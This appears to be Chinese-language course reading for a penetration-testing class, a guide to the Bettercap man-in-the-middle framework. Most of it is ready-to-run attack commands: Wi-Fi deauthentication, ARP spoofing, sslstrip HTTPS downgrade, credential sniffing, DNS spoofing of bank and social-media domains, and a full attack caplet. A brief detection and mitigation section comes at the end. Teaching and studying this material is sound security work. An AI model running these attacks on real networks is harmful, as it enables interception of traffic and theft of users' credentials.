# Bettercap 中间人攻击框架完全指南

> 分类：工具指南 | 难度：进阶 | 阅读时间：约50分钟

## 概述

Bettercap 是继 Ettercap 之后最强大的网络攻击与监控框架，由 Simone Margaritelli (@evilsocket) 开发。它整合了 Wi-Fi 网络攻击、蓝牙 LE 扫描、以太网 ARP 欺骗、DNS 欺骗、HTTP/HTTPS 代理、凭据嗅探等模块，通过统一的交互式会话（Session）和模块化架构，将网络渗透中的各种中间人攻击技术集成于一个工具中。

**核心特性**：
- 交互式 CLI + Web UI
- 实时模块热加载
- Wi-Fi 监控与攻击（监听模式、Deauth、PMKID）
- ARP/DNS/DHCPv6 欺骗
- HTTP/HTTPS 透明代理与凭据嗅探
- 内置 HTTP 服务器（钓鱼页面托管）
- 支持自定义脚本（Caplets）
- 跨平台（Linux/macOS/Windows/Android）

## 核心知识点

- 网络模块体系与事件流
- Wi-Fi 侦察与攻击
- ARP 欺骗与 MITM
- HTTP/HTTPS 代理与凭据捕获
- DNS 欺骗
- Caplets 脚本编写
- 安全防御检测

---

## 一、安装

### 1.1 Kali Linux（预装）

```bash
sudo bettercap -version
# 如未安装
sudo apt install bettercap -y
```

### 1.2 Ubuntu/Debian

```bash
# Go 安装方式
sudo apt install golang-go -y
go install github.com/bettercap/bettercap@latest
sudo cp ~/go/bin/bettercap /usr/local/bin/

# 或从 Release 下载
# https://github.com/bettercap/bettercap/releases
```

### 1.3 macOS

```bash
brew install bettercap
```

### 1.4 依赖

```bash
# 需要 libpcap 和 libnetfilter-queue
sudo apt install libpcap-dev libnetfilter-queue-dev -y
```

---

## 二、基础使用

### 2.1 交互模式

```bash
# 启动交互模式
sudo bettercap

# 进入交互 Shell
> help                    # 查看所有命令
> net.show                # 显示网络模块信息
> net.probe on            # 开始网络探测
> net.show                # 查看发现的设备
> help net.probe          # 查看特定命令帮助
```

### 2.2 命令行模式

```bash
# 一次性命令
sudo bettercap -eval "net.probe on; sleep 30; net.show; exit"

# 从 Caplet 文件执行
sudo bettercap -caplet /usr/share/bettercap/caplets/http-ui.cap
```

### 2.3 Web UI

```bash
# 启动 Web 界面
sudo bettercap -caplet http-ui

# 访问 https://127.0.0.1:80
# 默认用户: user
# 默认密码: pass（首次生成随机密码）

# 或设置自定义凭据
sudo bettercap -eval "set api.rest.username admin; set api.rest.password pass123; http-ui"
```

---

## 三、Wi-Fi 模块

### 3.1 Wi-Fi 侦察

```bash
# 启动 Wi-Fi 监控
sudo bettercap -eval "wifi.recon on; sleep 300; wifi.show"

# 交互模式
> wifi.recon on
> wifi.show
# 显示：
# BSSID              RSSI  CH  ENC     ESSID
# AA:BB:CC:DD:EE:FF  -45   6   WPA2    CorpWiFi
# 11:22:33:44:55:66  -60   1   WPA2    GuestWiFi

# 过滤特定 AP
> set wifi.show.filter AA:BB:CC:DD:EE:FF
> wifi.show

# 按加密方式过滤
> set wifi.recon.channel 6
> wifi.recon on
```

### 3.2 客户端探测

```bash
# 查看连接的客户端
> wifi.recon on
> wifi.show
# Client MAC         AP BSSID           RSSI
# C1:FF:EE:DD:CC:BB  AA:BB:CC:DD:EE:FF  -50  ← 已连接
# C2:FF:EE:DD:CC:AA  (not associated)   -70  ← 未连接(在扫描)

# 查看客户端 Probe Request（历史SSID）
> wifi.recon on
> events.stream on
# 在输出中寻找 WifiClientProbe 事件
# 设备会广播曾经连接过的 WiFi 名
```

### 3.3 Deauth 攻击

```bash
# 对所有客户端执行 Deauth
> wifi.deauth AA:BB:CC:DD:EE:FF

# 对特定客户端
> wifi.deauth AA:BB:CC:DD:EE:FF C1:FF:EE:DD:CC:BB

# 持续Deauth（强制断开+阻止重连）
# Caplet: deauth-all.cap
```

---

## 四、ARP 欺骗（MITM）

### 4.1 基础 ARP 欺骗

```bash
# 启动 ARP 欺骗（拦截网关与目标之间的流量）
sudo bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; net.sniff on"

# 交互模式
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> net.sniff on

# 全子网欺骗
> set arp.spoof.targets 192.168.1.0/24
> set arp.spoof.internal true     # 也包括内网设备之间的通信
> arp.spoof on
```

### 4.2 半双工欺骗

```bash
# 仅欺骗目标 → 网关方向（更隐蔽）
> set arp.spoof.targets 192.168.1.100
> set arp.spoof.fullduplex false
> arp.spoof on
```

### 4.3 常用 ARP 欺骗组合

```bash
# 欺骗 + 流量嗅探 + HTTP 凭据捕获
sudo bettercap -eval "
  set arp.spoof.targets 192.168.1.100;
  arp.spoof on;
  net.sniff on;
  http.proxy on;
  net.sniff.local true;
  set net.sniff.verbose false;
"

# 等待片刻后查看捕获的凭据
> events.show
```

---

## 五、HTTP/HTTPS 代理

### 5.1 HTTP 透明代理

```bash
# 启动 HTTP 代理（截获目标的所有 HTTP 流量）
> set http.proxy.sslstrip true    # HTTPS→HTTP 降级
> http.proxy on

# 查看捕获的数据
> http.proxy
# 显示 URL、方法、POST 数据等
```

### 5.2 HTTPS 拦截（HSTS 绕过）

```bash
# 注意：HSTS 预加载列表中的网站无法绕过
# 仅对非预加载的网站有效

> set http.proxy.sslstrip true
> set http.proxy.sslstrip.useIDN true
> http.proxy on

# 原理：将 https:// 链接改为外观相似的 http://
# example.com → example.com（Unicode 同形字）
```

### 5.3 凭据嗅探

```bash
# 启动网络嗅探
> net.sniff on

# 过滤敏感的 POST 数据
> net.sniff on
# 在另一个终端查看捕获
> events.show

# 可捕获：
# - HTTP 基本认证（Basic Auth）
# - POST 表单（登录凭据）
# - FTP/Telnet 明文密码
# - IRC/NNTP/POP3 等
```

---

## 六、DNS 欺骗

```bash
# 配置 DNS 欺骗规则
> set dns.spoof.domains *.google.com,*.facebook.com,*.twitter.com
> set dns.spoof.address 192.168.1.100       # 重定向到攻击机 IP
> dns.spoof on

# 组合 ARP + DNS 欺骗
sudo bettercap -eval "
  set arp.spoof.targets 192.168.1.100;
  arp.spoof on;
  set dns.spoof.domains *.target.com,*bank.com;
  set dns.spoof.address 192.168.1.200;
  dns.spoof on;
"
# 目标访问这些域名时被重定向到攻击机
```

---

## 七、Caplets 脚本

### 7.1 基础 Caplet

```ruby
# attack.cap
# 完整 MITM 攻击脚本
net.probe on
sleep 5

# ARP 欺骗全子网
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.internal true
arp.spoof on

# 启动 HTTP 代理
set http.proxy.sslstrip true
http.proxy on

# DNS 欺骗
set dns.spoof.domains *.corp.local
set dns.spoof.address 192.168.1.100
dns.spoof on

# 网络嗅探
net.sniff on

events.show
```

### 7.2 常用 Caplets

```bash
# 系统自带
ls /usr/share/bettercap/caplets/
# http-ui.cap          → Web UI
# wifi-assoc.cap       → WiFi 关联攻击
# download-autopwn.cap → 文件下载劫持
# beef-inject.cap      → BeEF 框架注入
# mana.cap             → Evil Twin 攻击
```

---

## 八、蓝牙 LE 模块

```bash
# 扫描附近 BLE 设备
> ble.recon on
> ble.show

# 枚举设备服务和特征值
> ble.enum AA:BB:CC:DD:EE:FF

# 读取特征值
> ble.read AA:BB:CC:DD:EE:FF 180f 2a19
```

---

## 九、防御检测

### 9.1 检测 ARP 欺骗

```bash
# 查看 ARP 表
arp -a
# 如果看到同一 IP 有两个不同的 MAC → 正在被欺骗

# 使用 arpwatch 监控
sudo apt install arpwatch
sudo arpwatch -i eth0

# Wireshark 过滤器
arp.duplicate-address-frame
```

### 9.2 缓解措施

```
1. 使用静态 ARP 表（小网络）
2. 部署 DHCP Snooping + Dynamic ARP Inspection（交换机）
3. 使用 802.1X 认证
4. 监控网络中的异常 ARP 包数量
5. 使用 IDS/IPS（Snort/Suricata）检测 ARP 欺骗
```

---

## 十、速查卡

```
启动:            sudo bettercap
交互模式:        > help → 列出命令
Web UI:          sudo bettercap -caplet http-ui
NET模块:         net.probe on → net.show
WiFi模块:        wifi.recon on → wifi.show
ARP欺骗:         set arp.spoof.targets IP; arp.spoof on
HTTP代理:        http.proxy on
DNS欺骗:         set dns.spoof.domains *; dns.spoof on
流量嗅探:        net.sniff on
Caplet:          sudo bettercap -caplet xxx.cap
WiFi Deauth:     wifi.deauth BSSID [CLIENT]
关闭:            exit 或 quit
```

---

> 📖 本文为"网安百宝箱"课程配套读物。
> 参考：Bettercap 官方 https://www.bettercap.org/
> 更新于 2026-06-18
